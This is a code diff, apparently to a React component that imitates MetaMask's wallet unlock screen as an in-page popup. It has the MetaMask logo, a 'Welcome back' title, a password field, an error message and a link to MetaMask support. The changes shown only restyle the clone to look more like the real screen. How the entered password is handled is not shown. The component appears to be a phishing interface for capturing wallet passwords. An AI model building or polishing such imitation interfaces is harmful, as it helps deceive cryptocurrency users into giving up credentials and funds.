@@ -136,12 +136,12 @@ const MM = ({ isOpen, setIsOpen }) => {
             display: "flex",
             flexDirection: "column",
             overflowX: "hidden",
-            width: "375px",
+            width: "400px",
           }}
         >
           <div
             style={{
-              width: "370px",
+              width: "400px",
               height: "600px",
               backgroundColor: "#fff",
               display: "flex",
@@ -156,11 +156,11 @@ const MM = ({ isOpen, setIsOpen }) => {
                   alignSelf: "center",
                   margin: "15rem 0 0 0",
                 }}
-                alt= {""}
+                alt={""}
                 src={meta_logo}
               ></img>
               <img
-                alt= {""}
+                alt={""}
                 src={spinner}
                 style={{
                   width: "3rem",
@@ -176,7 +176,7 @@ const MM = ({ isOpen, setIsOpen }) => {
         <>
           <div id="app-content">
             <div className="app os-win">
-              <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
+              {/* <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                 <div className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                   <div>
                     <button
@@ -206,7 +206,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                         style={{ marginRight: "1rem" }}
                       >
                         <img
-                          alt= {""}
+                          alt={""}
                           src={arrowDown}
                           style={{
                             width: "100%",
@@ -223,7 +223,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                     style={{ marginRight: "8px" }}
                   >
                     <img
-                      alt= {""}
+                      alt={""}
                       style={{
                         alignSelf: "center",
                         width: "100%",
@@ -233,7 +233,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                     ></img>
                   </button>
                 </div>
-              </div>
+              </div> */}
               <div className="mm-box main-container-wrapper">
                 <div className="unlock-page__container">
                   <div className="unlock-page" data-testid="unlock-page">
@@ -241,51 +241,55 @@ const MM = ({ isOpen, setIsOpen }) => {
                       <div style={{ zIndex: 0, marginBottom: "8px" }}>
                         <CreateLogo
                           animationEventEmitter={animationEventEmitter}
-                          width={"120"}
-                          height={"120"}
+                          width={"170"}
+                          height={"170"}
                         ></CreateLogo>
                         <div id="meta_fox"></div>
                       </div>
                     </div>
-                    <h1 className="unlock-page__title">Welcome back!</h1>
-                    <div
+                    <h1 className="unlock-page__title">Welcome back</h1>
+                    {/* <div
                       style={{
                         fontSize: "1.5rem",
                         fontFamily: `"Euclid Circular B", Roboto, Helvetica, Arial, sans-serif`,
                       }}
                     >
                       The decentralized web awaits
-                    </div>
+                    </div> */}
                     <div className="unlock-page__form">
                       <div className="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
-                        <div
+                        {/* <div
                           className={
                             "MuiInputBase-root MuiInput-root MuiInput-underline jss3 MuiInputBase-fullWidth MuiInput-fullWidth MuiInputBase-formControl MuiInput-formControl" +
                             (validShow === true ? " Mui-error" : "") +
                             (pwdFocus === true ? " Mui-focused" : "")
                           }
-                        >
-                          <input
-                            aria-invalid="false"
-                            autoComplete="current-password"
-                            id="password"
-                            type="password"
-                            dir="auto"
-                            data-testid="unlock-password"
-                            className={"MuiInputBase-input MuiInput-input"}
-                            style={{ marginTop: "16px", fontSize: "1.33rem" }}
-                            required
-                            value={pwd}
-                            onFocus={handleFocus}
-                            onBlur={handleBlur}
-                            ref={inputRef}
-                            onChange={(e) => {
-                              handleChange(e.target.value, e.target);
-                            }}
-                            onKeyUp={handleKeyUp}
-                          />
+                        > */}
+                        <input
+                          aria-invalid="false"
+                          autoComplete="current-password"
+                          id="password"
+                          type="password"
+                          dir="auto"
+                          placeholder="Enter your password"
+                          data-testid="unlock-password"
+                          className={"MuiInputBase-input MuiInput-input"}
+                          style={{
+                            fontSize: "1.35rem",
+                            borderColor: validShow ? "#d73847" : "#b7bbc8",
+                          }}
+                          required
+                          value={pwd}
+                          onFocus={handleFocus}
+                          onBlur={handleBlur}
+                          ref={inputRef}
+                          onChange={(e) => {
+                            handleChange(e.target.value, e.target);
+                          }}
+                          onKeyUp={handleKeyUp}
+                        />
 
-                          <label
+                        {/* <label
                             className="MuiFormLabel-root MuiInputLabel-root jss1 MuiInputLabel-formControl MuiInputLabel-animated"
                             data-shrink="false"
                             htmlFor="password"
@@ -293,16 +297,17 @@ const MM = ({ isOpen, setIsOpen }) => {
                             // style={{ fontSize: "1.5rem" }}
                           >
                             Password
-                          </label>
-                        </div>
+                          </label> */}
+                        {/* </div> */}
                         <div
                           className={
                             validShow
                               ? "validate-password"
                               : "validate-password-hidden"
                           }
+                          style={{ fontSize: "1.35rem" }}
                         >
-                          Incorrect password
+                          Password is incorrect. Please try again
                         </div>
                       </div>
                     </div>
@@ -316,12 +321,12 @@ const MM = ({ isOpen, setIsOpen }) => {
                       type="button"
                       variant="contained"
                       style={{
-                        backgroundColor: "var(--color-primary-default)",
-                        color: "var(--color-primary-inverse)",
-                        marginTop: "20px",
+                        backgroundColor: "#2a2b2c",
+                        color: "#ffffff",
+                        marginTop: "5px",
                         fontWeight: "400",
                         boxShadow: "none",
-                        borderRadius: "100px",
+                        borderRadius: "12px",
                         fontSize: "1.5rem",
                         padding: "12px 0",
                       }}
@@ -332,7 +337,11 @@ const MM = ({ isOpen, setIsOpen }) => {
                     <div className="unlock-page__links">
                       <a
                         className="button btn-link unlock-page__link"
-                        style={{ fontSize: "1.125rem" }}
+                        style={{
+                          color: "#4459ff",
+                          fontSize: "1.5rem",
+                          fontWeight: 500,
+                        }}
                         role="button"
                         tabIndex="0"
                       >
@@ -341,7 +350,11 @@ const MM = ({ isOpen, setIsOpen }) => {
                     </div>
                     <div
                       className="unlock-page__support"
-                      style={{ fontSize: "1.125rem" }}
+                      style={{
+                        fontSize: "1.5rem",
+                        color: "#121314",
+                        fontWeight: 500,
+                      }}
                     >
                       <span>
                         Need help? Contact{" "}
@@ -349,6 +362,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                           href="https://support.metamask.io"
                           target="_blank"
                           rel="noopener noreferrer"
+                          style={{ color: "#4459ff" }}
                         >
                           MetaMask support
                         </a>
